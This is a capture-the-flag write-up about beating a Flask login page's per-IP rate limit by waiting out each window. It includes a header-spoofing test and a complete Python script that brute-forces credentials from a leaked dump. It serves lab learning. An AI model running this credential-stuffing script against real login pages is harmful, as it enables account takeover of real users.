# CyLab Academy — IP Rate Limiter Bypass & Credential Brute-Force

## Challenge Overview

| Field           | Details                                              |
|----------------|------------------------------------------------------|
| **Platform**   | [CyLab Academy](https://learn.cylabacademy.org/)     |
| **Category**   | Web Exploitation / Scripting                         |
| **Tools Used** | Python, Burp Suite, requests library                 |
| **Difficulty** | Intermediate                                         |

---

## Challenge Description

Bypass an IP-based rate limiter on a Flask login page, brute-force credentials from a public credential dump, and capture the flag.

- The login endpoint blocked requests after **10 failed attempts per 30-second window**, keyed on the client's IP address
- A credential dump was provided in `username;password` format
- Goal: find the valid credentials and log in as the target user to retrieve the flag

---

## Thought Process

### Step 1 — Understanding the Rate Limiter

The app enforced a hard block after 10 failed login attempts within a 30-second window using `request.remote_addr` — the raw client IP directly from the socket, with no proxy middleware or trust configuration.

**First instinct:** spoof the IP using the `X-Forwarded-For` header.

Tested in **Burp Suite** by injecting:

```
X-Forwarded-For: 10.0.0.1
```

The app ignored it completely. The server read only `request.remote_addr`, so header spoofing had no effect.

### Step 2 — Doing the Math

Rather than looking for a clever bypass, the math pointed to a simpler solution:

```
~100 credentials to try
10 attempts per 30-second window
100 ÷ 10 = 10 windows × 30s = 5 minutes total
```

No bypass needed. Just a script that respects the window — attempt 10, sleep 30 seconds, repeat.

---

## Source Code Analysis

Before writing the exploit, the app's source code was analyzed to understand:

- The exact login endpoint (`/login`)
- How the POST request was structured
- What a **successful** login response looked like

**Key finding:** Success was not indicated by a message like `"Successfully logged in"` — it was a **302 redirect** to `/` where the flag lives. This informed how the script detected success.

> 📌 **Always read the source code before writing your exploit. The answer is always in there.**

---

## The Bugs

Three bugs caused all 100 credentials to fail silently before the script worked correctly.

### Bug 1 — `strip()` Not Reassigned ❌

```python
# Wrong — strip() returns a new string, doesn't modify in place
line.strip()
username, password = line.split(";")

# Correct — reassign the result
line = line.strip()
username, password = line.split(";")
```

Every password had a silent `\n` at the end. All 100 credentials failed because of **one missing assignment**. This was the most impactful bug.

### Bug 2 — Checking for Wrong Success String ❌

```python
# Wrong — this string doesn't exist in the app's response
if "Successfully logged in" in response.text:

# Correct — success is a redirect, check the final URL
if "/dashboard" in response.url or response.url != login_url:
```

### Bug 3 — Missing `allow_redirects=True` ❌

```python
# Wrong — session never follows the redirect to / where the flag lives
response = session.post(url, data=payload)

# Correct — follow the redirect
response = session.post(url, data=payload, allow_redirects=True)
```

Without this, the session stopped at the 302 response and never reached the flag page.

---

## Solution Script

```python
import requests
import time

SITE_URL = "http://candy-mountain.picoctf.net:49592/login"
cred_file = "creds-dump.txt"

MAX_REQUESTS = 10
EPOCH_DURATION = 30

def credentials(filepath):
    creds = []
    with open(filepath, "r") as f:
        for line in f:
            line = line.strip()
            username, password = line.split(";", 1)
            creds.append((username, password))
    return creds


def try_login(session, username, password):
    response = session.post(
        SITE_URL, data = {"username": username, "password": password}, allow_redirects=True
    ) 
    return response

def check_login_status(response):
    if "Invalid username or password." in response.text:
        return False
    if response.url != SITE_URL:
        return True
    else:
        return False
    
def main():
    creds = credentials(cred_file)

    session = requests.Session()
    attempt_count = 0

    for username, password in creds:

        if attempt_count == MAX_REQUESTS:
            print(f"Reached {MAX_REQUESTS} attempts. Waiting {EPOCH_DURATION}s for reset...")
            time.sleep(EPOCH_DURATION)
            attempt_count = 0

        print(f"Trying {username} : {password}")
        response = try_login(session, username, password)
        attempt_count += 1

        if check_login_status(response):
            print(f"SUCCESS! username={username} password={password}")
            print(response.text)
            return
        

if __name__ == "__main__":
    main()
```

### How It Works

1. **Parses the credential dump** — reads `username;password` pairs from the file, stripping whitespace correctly
2. **Opens a `requests.Session()`** — preserves cookies across requests and follows redirects
3. **Sends POST requests** to `/login` with a 10-attempt counter
4. **Sleeps 30 seconds** every 10 attempts to reset the rate limit window
5. **Detects success** by checking `response.url` for a redirect away from the login page — not by looking for a text string
6. **Prints the flag** from the final page's response body

---

## Attack Flow Summary

```
Analyze rate limiter      →  10 attempts / 30s window, keyed on raw IP
        ↓
Test X-Forwarded-For      →  App ignores header (request.remote_addr only)
        ↓
Do the math               →  ~5 mins total, no bypass needed
        ↓
Read source code          →  Success = 302 redirect, not a text message
        ↓
Write Python script       →  Parse creds, 10 attempts, sleep 30s, repeat
        ↓
Fix Bug 1 (strip)         →  Reassign line = line.strip()
        ↓
Fix Bug 2 (success check) →  Check response.url, not response.text
        ↓
Fix Bug 3 (redirects)     →  Add allow_redirects=True
        ↓
Valid credentials found   →  Flag captured ✅
```

---

## What I Learned

### Recon & Tool Selection
- **Read the source code before writing the exploit** — success conditions, endpoints, and response formats are all in there
- **X-Forwarded-For spoofing only works** when the server trusts proxy headers — always verify before assuming
- **Rate limits based on a single mutable factor** can often be outwaited, not outsmarted — do the math first

### Python & Scripting
- **Always reassign `.strip()`** — it returns a new string and does not modify in place; a silent `\n` will break every comparison
- **Use `requests.Session()`** to preserve cookies and authentication state across multiple requests
- **Success isn't always text** — sometimes it's a redirect; check `response.url` or `response.status_code`
- **`allow_redirects=True`** is required to follow 302 redirects and reach the final destination page

### Mindset
- **Patience over cleverness** — the simplest solution (wait out the window) was more effective than a complex bypass
- **Bugs in exploit scripts are silent** — all 100 credentials "failed" with no error, making diagnosis harder; always validate assumptions at each step

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite | Testing `X-Forwarded-For` header spoofing |
| Python `requests` | Scripting the brute-force with session handling |
| Source Code Analysis | Understanding success conditions and endpoint behavior |

---

## References

- [Python requests Documentation](https://docs.python-requests.org/en/latest/)
- [PortSwigger — Rate Limiting](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
- [CyLab Academy](https://learn.cylabacademy.org/library/743?page=1&category=1&difficulty=2)
